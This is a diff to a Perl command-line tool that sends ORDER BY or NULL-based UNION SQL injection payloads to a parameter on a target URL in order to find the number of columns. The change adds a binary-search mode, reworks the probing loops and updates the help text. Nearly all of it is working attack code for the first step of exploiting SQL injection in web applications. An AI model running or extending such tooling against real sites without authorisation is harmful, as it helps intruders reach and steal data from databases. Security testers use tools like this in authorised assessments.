@@ -7,6 +7,7 @@ use strict;
 use warnings;
 use LWP::UserAgent;
 use Getopt::Long;
+use feature 'say';
 
 our (
     $method,    # GET/POST
@@ -15,19 +16,21 @@ our (
     $targetURL,
     $proxy,
     $null,
-    $help
+    $help,
+    $binSearch
 );
 
 print "Determining number of columns for UNION based SQL injection\n";
 
 GetOptions(
-    'method=s'  => \$method,
-    'param=s'   => \$paramName,
-    'max=i'     => \$maxTries,
-    'url=s'     => \$targetURL,
-    'proxy=s'   => \$proxy,
-    'null'      => \$null,
-    'h|help'    => \$help
+    'method=s'      => \$method,
+    'param=s'       => \$paramName,
+    'max=i'         => \$maxTries,
+    'url=s'         => \$targetURL,
+    'proxy=s'       => \$proxy,
+    'null'          => \$null,
+    'h|help'        => \$help,
+    'bin-search'    => \$binSearch
 );
 
 &help() if $help;
@@ -60,23 +63,58 @@ if ($proxy) {
     }
 }
 
-for my $i (1..$maxTries) {
-    my $payload;
-    if ($null) {
-        $payload = &nullVariantPayload($i);
-    } else {
-        $payload = &orderByVariantPayload($i);
-    }
-    my $result = &sendRequest($payload);
-    if ($result && $result != -1) {
-        if ($null) {
+if ($null) {
+    for my $i (1..$maxTries) {
+        my $payload = &nullVariantPayload($i);
+        my $result = &sendRequest($payload);
+        if ($result && $result != -1) {
             print "Column number: $i\n";
             exit;
         }
+    }
+} else {
+    if ($binSearch) {
+        my @nums = (1..$maxTries + 1);
+        my %previousQuery = (res => -1, num => -1);
+        my ($begin, $end) = (0, $#nums);
+        while ($begin <= $end) {
+            my $middle = int(($begin + $end) / 2);
+            my $payload = &orderByVariantPayload($nums[$middle]);
+            my $result = &sendRequest($payload);
+
+            if ($previousQuery{res} != -1 && abs($middle - $previousQuery{num}) == 1) {
+                if ($result == 0 && $previousQuery{res} == 1) {
+                    print "Column number: $nums[$previousQuery{num}]\n";
+                    exit;
+                }
+            }
+
+            if ($result == 1 && ($end - $begin) == 1) {
+                if (&sendRequest(&orderByVariantPayload($nums[$middle + 1])) == 0) {
+                    print "Column number: $nums[$previousQuery{num}]\n";
+                    exit;
+                }
+            }
+
+            if ($result == 1) {
+                $begin = $middle;
+            } elsif (!$result) {
+                $end = $middle;
+            }
+
+            last if $previousQuery{num} == $middle;
+
+            $previousQuery{res} = $result;
+            $previousQuery{num} = $middle;
+        }
     } else {
-        unless ($null) {
-            print "Column number: " . --$i . "\n";
-            exit;
+        for my $i (1..$maxTries) {
+            my $payload = &orderByVariantPayload($i);
+            my $result = &sendRequest($payload);
+            if (!$result && $result != -1) {
+                say "Column number:" . --$i;
+                exit;
+            }
         }
     }
 }
@@ -114,10 +152,11 @@ sub orderByVariantPayload {
 }
 
 sub help {
-    print "\t-url=<target URL>\turl for site that we're testing\n";
-    print "\t-param=<param name>\tparameter name in which we have found SQLi\n";
-    print "\t-max=<number>\t\tmax number of columns we're checking (default 10)\n";
-    print "\t-proxy=<proxy URL>\tie. Burp Suite\n";
-    print "\t-null\t\t\tif you want to use NULL based method (default - using ORDER BY)\n";
+    print "\t--url=<target URL>\turl for site that we're testing\n";
+    print "\t--param=<param name>\tparameter name in which we have found SQLi\n";
+    print "\t--max=<number>\t\tmax number of columns we're checking (default 10)\n";
+    print "\t--proxy=<proxy URL>\tie. Burp Suite\n";
+    print "\t--null\t\t\tif you want to use NULL based method (default - using ORDER BY)\n";
+    print "\t--bin-search\t\tif you want to use binary search (using ORDER BY only)\n";
     exit;
 }
